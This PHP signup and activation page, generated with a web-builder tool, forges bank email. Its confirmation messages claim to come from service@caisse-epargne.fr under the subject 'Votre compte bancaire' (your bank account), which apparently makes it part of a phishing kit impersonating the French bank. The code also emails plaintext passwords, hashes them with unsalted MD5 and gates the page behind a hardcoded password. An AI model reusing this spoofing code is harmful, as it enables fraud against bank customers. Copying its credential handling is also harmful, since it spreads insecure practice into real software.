<?php
$database = './usersdb.php';
$success_page = './act=ok.php';
$activated_page = basename(__FILE__);
$error_message = "";
if (!file_exists($database))
{
   die('User database not found!');
   exit;
}
if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['form_name'] == 'signupform')
{
   $newusername = $_POST['username'];
   $newemail = $_POST['email'];
   $newpassword = $_POST['password'];
   $confirmpassword = $_POST['confirmpassword'];
   $newfullname = $_POST['fullname'];
   $website = $_SERVER['HTTP_HOST'];
   $script = $_SERVER['SCRIPT_NAME'];
   $timestamp = time();
   $code = md5($website.$timestamp.rand(100000, 999999));
   if ($newpassword != $confirmpassword)
   {
      $error_message = 'Password and Confirm Password are not the same!';
   }
   else
   if (!preg_match("/^[A-Za-z0-9_!@$]{1,50}$/", $newusername))
   {
      $error_message = 'Username is not valid, please check and try again!';
   }
   else
   if (!preg_match("/^[A-Za-z0-9_!@$]{1,50}$/", $newpassword))
   {
      $error_message = 'Password is not valid, please check and try again!';
   }
   else
   if (!preg_match("/^[A-Za-z0-9_!@$.' &]{1,50}$/", $newfullname))
   {
      $error_message = 'Fullname is not valid, please check and try again!';
   }
   else
   if (!preg_match("/^.+@.+\..+$/", $newemail))
   {
      $error_message = 'Email is not a valid email address. Please check and try again.';
   }
   $items = file($database, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
   foreach($items as $line)
   {
      list($username, $password, $email, $fullname) = explode('|', trim($line));
      if ($newusername == $username)
      {
         $error_message = 'Username already used. Please select another username.';
         break;
      }
   }
   if (empty($error_message))
   {
      $file = fopen($database, 'a');
      fwrite($file, $newusername);
      fwrite($file, '|');
      fwrite($file, md5($newpassword));
      fwrite($file, '|');
      fwrite($file, $newemail);
      fwrite($file, '|');
      fwrite($file, $newfullname);
      fwrite($file, '|0|');
      fwrite($file, $code);
      fwrite($file, "\r\n");
      fclose($file);
      $subject = 'Votre compte bancaire';
      $message = 'Votre compte a été cree avec succès';
      $message .= "\r\nUsername: ";
      $message .= $newusername;
      $message .= "\r\nPassword: ";
      $message .= $newpassword;
      $message .= "\r\n";
      $message .= "\r\nhttp://".$website.$script."?user=".$newusername."&code=$code";
      $header  = "From: service@caisse-epargne.fr"."\r\n";
      $header .= "Reply-To: service@caisse-epargne.fr"."\r\n";
      $header .= "MIME-Version: 1.0"."\r\n";
      $header .= "Content-Type: text/plain; charset=utf-8"."\r\n";
      $header .= "Content-Transfer-Encoding: 8bit"."\r\n";
      $header .= "X-Mailer: PHP v".phpversion();
      mail($newemail, $subject, $message, $header);
      header('Location: '.$success_page);
      exit;
   }
}
else
if (isset($_GET['code']) && isset($_GET['user']))
{
   $found = false;
   $items = file($database, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
   foreach($items as $line)
   {
      list($username, $password, $emailaddress, $fullname, $active, $code) = explode('|', trim($line));
      if ($username == $_GET['user'] && $code == $_GET['code'])
      {
         $found = true;
      }
   }
   if ($found == true)
   {
      $file = fopen($database, 'w');
      foreach($items as $line)
      {
         $values = explode('|', trim($line));
         if ($_GET['user'] == $values[0])
         {
            $values[4] = "1";
            $values[5] = "NA";
            $line = '';
            for ($i=0; $i < count($values); $i++)
            {
               if ($i != 0)
                  $line .= '|';
               $line .= $values[$i];
            }
         }
         fwrite($file, $line);
         fwrite($file, "\r\n");
      }
      fclose($file);
   }
   else
   {
      die ('User not found!');
   }
   header("refresh:5;url=".$activated_page);
   echo 'Your user account was succesfully activated. You\'ll be redirected in about 5 secs. If not, click <a href="'.$activated_page.'">here</a>.';
   exit;
}
if (session_id() == "")
{
   session_start();
}
$password = '';
if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['form_name'] == 'loginform')
{
   $password = isset($_POST['password']) ? $_POST['password'] : '';
   if ($password == 'roland10')
   {
      $_SESSION['password'] = $password;
   }
}
else
{
   $password = isset($_SESSION['password']) ? $_SESSION['password'] : '';
}
if ($password != 'roland10')
{
   echo "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">\n";
   echo "<html>\n";
   echo "<head>\n";
   echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n";
   echo "<title>activation</title>\n";
   echo "</head>\n";
   echo "<body style=\"background-color:#FFFFFF\">\n";
   echo "<center>\n";
   echo "<br>\n";
   if($_SERVER['REQUEST_METHOD'] == 'POST')
      echo "<span style=\"font-size:13px;font-family:Arial;font-weight:normal;text-decoration:none;color:#FF0000\">The specified password is invalid!<br><br><br></span>\n";
   else
      echo "<span style=\"font-size:13px;font-family:Arial;font-weight:normal;text-decoration:none;color:#000000\">This page is password protected.<br><br><br></span>\n";
   echo "<form method=\"post\" action=\"".basename(__FILE__)."\">\n";
   echo "<input type=\"hidden\" name=\"form_name\" value=\"loginform\">\n";
   echo "   <table cellspacing=\"0\" cellpadding=\"3\" style=\"border:1px solid #535353;\">\n";
   echo "      <tr>\n";
   echo "         <td colspan=\"2\" style=\"background-color:#535353;color:#FFFFFF;font-size:13px;font-family:Arial;font-weight:normal;text-decoration:none;text-align:center;padding:4px;\"><strong>Login</strong></td>\n";
   echo "      </tr>\n";
   echo "      <tr>\n";
   echo "         <td style=\"font-size:13px;font-family:Arial;font-weight:normal;text-decoration:none;color:#000000;text-align:right;\" width=\"30%\" height=\"60\">Password:</td>\n";
   echo "         <td style=\"font-size:13px;font-family:Arial;font-weight:normal;text-decoration:none;color:#000000;text-align:left\" width=\"70%\" height=\"60\"><input type=\"password\" name=\"password\" value=\"\" style=\"border:1px solid #535353;width:120px;\">&nbsp;&nbsp;<input type=\"submit\" value=\"Login\"></td>\n";
   echo "      </tr>\n";
   echo "   </table>\n";
   echo "</form>\n";
   echo "</center>\n";
   echo "</body>\n";
   echo "</html>\n";
   exit;
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>activation</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="Sans.css" rel="stylesheet" type="text/css">
<link href="creat=ac.css" rel="stylesheet" type="text/css">
</head>
<body>
<div id="space"><br></div>
<div id="container">
<div id="wb_Signup1" style="position:absolute;left:274px;top:81px;width:354px;height:281px;text-align:right;z-index:0;">
<form name="signupform" method="post" action="<?php echo basename(__FILE__); ?>" id="signupform">
<input type="hidden" name="form_name" value="signupform">
<table id="Signup1">
<tr>
   <td class="Signup1_header" colspan="2" style="height:20px;">Sign up for a new account</td>
</tr>
<tr>
   <td style="height:20px">Full Name:</td>
   <td style="text-align:left"><input class="Signup1_input" name="fullname" type="text" id="fullname"></td>
</tr>
<tr>
   <td style="height:20px">User Name:</td>
   <td style="text-align:left"><input class="Signup1_input" name="username" type="text" id="username"></td>
</tr>
<tr>
   <td style="height:20px;">Password:</td>
   <td style="text-align:left"><input class="Signup1_input" name="password" type="password" id="password"></td>
</tr>
<tr>
   <td style="height:20px">Confirm Password:</td>
   <td style="text-align:left"><input class="Signup1_input" name="confirmpassword" type="password" id="confirmpassword"></td>
</tr>
<tr>
   <td style="height:20px">E-mail:</td>
   <td style="text-align:left"><input class="Signup1_input" name="email" type="text" id="email"></td>
</tr>
<tr>
   <td colspan="2"><?php echo $error_message; ?></td>
</tr>
<tr>
   <td>&nbsp;</td><td style="text-align:left;vertical-align:bottom"><input class="Signup1_button" type="submit" name="signup" value="Activer" id="signup"></td>
</tr>
</table>
</form>
</div>

</div>
</body>
</html>